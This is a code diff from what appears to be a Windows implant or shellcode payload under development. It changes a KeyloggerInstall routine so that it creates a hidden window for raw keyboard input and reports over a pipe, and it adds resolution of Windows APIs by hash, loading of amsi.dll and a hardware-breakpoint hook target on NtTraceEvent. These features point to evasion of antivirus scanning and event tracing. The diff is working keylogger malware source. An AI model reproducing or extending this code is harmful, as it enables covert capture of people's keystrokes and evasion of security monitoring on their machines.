@@ -63,7 +63,8 @@ auto DECLFN KeyloggerInstall(
     Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
 
 	// NEED TO FIX BELOW CODE : issue in creating a message-only window
-    HWND WindowHandle = Instance->Win32.CreateWindowExW(0, WinClass.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, Instance->Win32.GetModuleHandleA(NULL), NULL);
+    //HWND WindowHandle = Instance->Win32.CreateWindowExW(0, WinClass.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, Instance->Win32.GetModuleHandleA(NULL), NULL);
+	HWND WindowHandle = Instance->Win32.CreateWindowExW(0, WinClass.lpszClassName, KEYLOG_CLASS_NAME, WS_OVERLAPPEDWINDOW & ~WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, Instance->Win32.GetModuleHandleA(NULL), NULL);
     DWORD err = NtCurrentTeb()->LastErrorValue;
 	Instance->Win32.DbgPrint("CreateWindowExW err: %d\n", err);
 
@@ -349,19 +350,24 @@ auto DECLFN LibLoad( CHAR* LibName ) -> UPTR {
 auto DECLFN LoadEssentials( INSTANCE* Instance ) -> VOID {
     UPTR Ntdll    = LoadModule( HashStr( "ntdll.dll" ) );
     UPTR Kernel32 = LoadModule( HashStr( "kernel32.dll" ) );
-    UPTR User32 = LoadModule(HashStr("user32.dll"));
-    UPTR Msvcrt = LoadModule(HashStr("msvcrt.dll"));
-
+    UPTR User32 = LoadModule(HashStr( "user32.dll" ));
+    UPTR Msvcrt = LoadModule(HashStr( "msvcrt.dll" ));
+    
     Instance->Win32.Ntdll = Ntdll;
 	Instance->Win32.Msvcrt = Msvcrt;
+	Instance->Win32.User32 = User32;
+
+    Instance->Win32.LoadLibraryA = (decltype(Instance->Win32.LoadLibraryA))LoadApi(Kernel32, HashStr("LoadLibraryA"));
+
+    if (!User32) User32 = (UPTR)LibLoad("user32.dll");
+
 
 	Instance->Win32.swprintf = (decltype(Instance->Win32.swprintf))LoadApi(Msvcrt, HashStr("swprintf"));
 	Instance->Win32.wcslen = (decltype(Instance->Win32.wcslen))LoadApi(Msvcrt, HashStr("wcslen"));
 	Instance->Win32.wcsncmp = (decltype(Instance->Win32.wcsncmp))LoadApi(Msvcrt, HashStr("wcsncmp"));
     
     Instance->Win32.DbgPrint = (decltype(Instance->Win32.DbgPrint))LoadApi(Ntdll, HashStr("DbgPrint"));
-    Instance->Win32.LoadLibraryA = (decltype(Instance->Win32.LoadLibraryA))LoadApi(Kernel32, HashStr("LoadLibraryA"));
-
+    
     Instance->Win32.NtClose = (decltype(Instance->Win32.NtClose))LoadApi(Ntdll, HashStr("NtClose"));
 
     Instance->Win32.GetProcAddress   = (decltype(Instance->Win32.GetProcAddress))LoadApi(Kernel32, HashStr("GetProcAddress"));
@@ -432,14 +438,25 @@ auto DECLFN LoadEssentials( INSTANCE* Instance ) -> VOID {
     Instance->Win32.RtlSecureZeroMemory = (decltype(Instance->Win32.RtlSecureZeroMemory))LoadApi(Kernel32, HashStr("RtlZeroMemory"));
 
     Instance->Hwbp.NtTraceEvent   = (PVOID)LoadApi(Ntdll, HashStr("NtTraceEvent"));
+
+
+    // Debug Statements for all APIs resolved
+	Instance->Win32.DbgPrint("\n[+] LoadLibraryA: %p", Instance->Win32.LoadLibraryA);
+	Instance->Win32.DbgPrint("\n[+] GetProcAddress: %p", Instance->Win32.GetProcAddress);
+	Instance->Win32.DbgPrint("\n[+] NtProtectVirtualMemory: %p", Instance->Win32.NtProtectVirtualMemory);
+	Instance->Win32.DbgPrint("\n[+] RtlAllocateHeap: %p", Instance->Win32.RtlAllocateHeap);
+	Instance->Win32.DbgPrint("\n[+] RtlFreeHeap: %p", Instance->Win32.RtlFreeHeap);
+	Instance->Win32.DbgPrint("\n[+] CreateWindowExW: %p", Instance->Win32.CreateWindowExW);
+	Instance->Win32.DbgPrint("\n[+] RegisterRawInputDevices: %p", Instance->Win32.RegisterRawInputDevices);
+	Instance->Win32.DbgPrint("\n");
 }
 
 auto DECLFN LoadAdds( INSTANCE* Instance ) -> VOID {
-    UPTR User32   = LoadModule( HashStr( "user32.dll" ) );
     UPTR Shell32  = LoadModule( HashStr( "shell32.dll" ) );
     UPTR Oleaut32 = LoadModule( HashStr( "oleaut32.dll" ) );
     UPTR Mscoree  = LoadModule( HashStr( "mscoree.dll" ) );
     UPTR Amsi     = LoadModule( HashStr( "amsi.dll" ) );
+    UPTR User32 = LoadModule(HashStr("user32.dll"));
 
     if ( ! User32   ) User32   = (UPTR)LibLoad( "user32.dll" );
     if ( ! Shell32  ) Shell32  = (UPTR)LibLoad( "shell32.dll" );
@@ -477,7 +494,9 @@ auto DECLFN Entry( PVOID Parameter ) -> VOID {
     Instance.Start      = StartPtr();
     Instance.Size       = (UPTR)EndPtr() - (UPTR)Instance.Start;
     Instance.HeapHandle = NtCurrentPeb()->ProcessHeap;
-    Instance.g_TitleBuffer[KEYLOG_BUFFER_LEN + 1] = {0};
+    //Instance.g_TitleBuffer[KEYLOG_BUFFER_LEN + 1] = {0};
+    Instance.g_TitleBuffer[0] = L'\0';
+    
 
     Parameter ? ArgBuffer = Parameter : ArgBuffer = (PVOID)((UPTR)Instance.Start + Instance.Size);
 
